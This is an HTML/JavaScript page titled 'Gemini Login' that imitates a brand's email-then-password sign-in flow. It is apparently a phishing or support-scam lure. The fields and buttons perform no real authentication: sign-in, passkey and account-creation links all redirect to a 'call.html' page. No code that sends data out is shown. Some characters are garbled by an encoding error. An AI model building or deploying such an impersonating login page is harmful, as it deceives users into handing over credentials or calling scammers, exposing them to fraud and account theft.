<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Gemini Login</title>
  <style>
    :root {
      --font: Arial, sans-serif;
      --primary: #000;
      --secondary: #eee;
      --text: #000;
      --border-radius: 10px;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: var(--font);
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 1rem;
      overflow-x: hidden;
    }

    .container {
      width: 100%;
      max-width: 400px;
    }

    .top-right {
      position: absolute;
      top: 1rem;
      right: 1rem;
      font-size: 0.875rem;
      max-width: 70%;
      text-align: right;
    }

    .top-right a {
      background: var(--secondary);
      padding: 0.5rem 0.75rem;
      border-radius: 20px;
      text-decoration: none;
      font-weight: bold;
      color: var(--text);
      display: inline-block;
      white-space: nowrap;
    }

    .logo {
      position: absolute;
      top: 1rem;
      left: 1rem;
    }

    .logo img {
      width: 32px;
      height: auto;
    }

    .title,
    .welcome {
      font-size: 1.75rem;
      font-weight: bold;
      margin-bottom: 1.5rem;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 0.875rem;
      font-size: 1rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: var(--border-radius);
    }

    .button,
    .passkey-button {
      width: 100%;
      padding: 0.875rem;
      font-size: 1rem;
      border-radius: 30px;
      border: none;
      cursor: pointer;
      margin-top: 0.5rem;
      transition: background 0.3s ease;
    }

    .button {
      background: var(--primary);
      color: white;
    }

    .passkey-button {
      background: var(--secondary);
      color: var(--text);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 1.5rem 0;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #ccc;
    }

    .divider:not(:empty)::before {
      margin-right: 0.5em;
    }

    .divider:not(:empty)::after {
      margin-left: 0.5em;
    }

    .checkbox {
      display: flex;
      align-items: center;
      font-size: 0.875rem;
      margin-top: 1.25rem;
      gap: 0.5rem;
    }

    .checkbox input[type="checkbox"] {
      transform: scale(1.1);
    }

    .hidden {
      display: none;
    }

    .email-display {
      background: #f8f8f8;
      padding: 0.875rem;
      border-radius: var(--border-radius);
      margin-bottom: 1rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }

    .email-display span {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      max-width: 70%;
    }

    .email-display button {
      background: var(--secondary);
      border: none;
      padding: 0.5rem 0.75rem;
      border-radius: 20px;
      cursor: pointer;
      font-size: 0.9rem;
      margin-top: 0.5rem;
    }

    .forgot {
      font-size: 0.875rem;
      margin-top: -0.5rem;
      margin-bottom: 1rem;
    }

    .forgot a {
      color: var(--text);
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .title,
      .welcome {
        font-size: 1.5rem;
      }

      .top-right {
        font-size: 0.75rem;
        max-width: 90%;
        top: 0.75rem;
        right: 0.75rem;
      }

      .top-right a {
        padding: 0.5rem;
        font-size: 0.75rem;
      }

      .logo img {
        width: 26px;
      }

      .email-display {
        flex-direction: column;
        align-items: flex-start;
      }

      .email-display button {
        width: 100%;
        margin-top: 0.75rem;
      }
    }
  </style>
</head>
<body>

  <!-- Logo -->
  <div class="logo">
    <img src="logo.jpg" alt="Gemini Logo" />
  </div>

  <!-- Top-right Account Link -->
  <div class="top-right">
    Donâ€™t have a Gemini account? <a href="call.html">Create a new account</a>
  </div>

  <!-- Login Container -->
  <div class="container">
    <!-- Step 1 -->
    <div id="step1">
      <div class="title">Sign in</div>
      <input type="email" id="email" placeholder="Email address" required inputmode="email" autocomplete="email" />
      <button type="button" class="button" onclick="goToStep2()">Continue</button>

      <div class="divider">OR</div>
      <button type="button" class="passkey-button" onclick="goToCall()">ðŸ”‘ Sign in with passkey</button>
    </div>

    <!-- Step 2 -->
    <div id="step2" class="hidden">
      <div class="welcome">Welcome</div>
      <div class="email-display">
        <span id="displayEmail"></span>
        <button type="button" onclick="goBack()">Change</button>
      </div>

      <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
      <div class="forgot"><a href="#">Forgot password?</a></div>

      <button type="button" class="button" onclick="login()">Sign in</button>

      <div class="divider">OR</div>
      <button type="button" class="passkey-button" onclick="goToCall()">ðŸ”‘ Sign in with passkey</button>

      <div class="checkbox">
        <input type="checkbox" id="remember" />
        <label for="remember">Remember my email address</label>
      </div>
    </div>
  </div>

  <!-- JavaScript -->
  <script>
    function goToStep2() {
      const emailInput = document.getElementById('email');
      const email = emailInput.value.trim();
      const isValid = /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email);

      if (isValid) {
        document.getElementById('displayEmail').textContent = email;
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
        document.getElementById('password').focus();
      } else {
        alert("Please enter a valid email address.");
      }
    }

    function goBack() {
      document.getElementById('step2').classList.add('hidden');
      document.getElementById('step1').classList.remove('hidden');
      document.getElementById('email').focus();
    }

    function login() {
      const password = document.getElementById('password').value.trim();
      if (password === "") {
        alert("Please enter your password.");
        return;
      }
      window.location.href = "call.html";
    }

    function goToCall() {
      window.location.href = "call.html";
    }

    document.addEventListener('keydown', function (e) {
      const step1 = document.getElementById('step1');
      const step2 = document.getElementById('step2');
      if (e.key === "Enter") {
        if (!step1.classList.contains('hidden')) {
          goToStep2();
        } else if (!step2.classList.contains('hidden')) {
          login();
        }
      }
    });
  </script>
